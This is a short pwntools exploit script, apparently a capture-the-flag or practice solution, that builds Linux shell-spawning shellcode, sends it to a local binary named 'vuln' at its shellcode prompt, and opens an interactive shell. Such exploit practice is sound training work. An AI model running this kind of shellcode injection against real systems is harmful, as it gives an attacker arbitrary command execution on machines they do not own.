from pwn import *

shellcode=asm(pwnlib.shellcraft.linux.sh())

io = process('./vuln')

io.sendlineafter('Enter your shellcode:\n',shellcode)

print io.recv()

io.interactive()
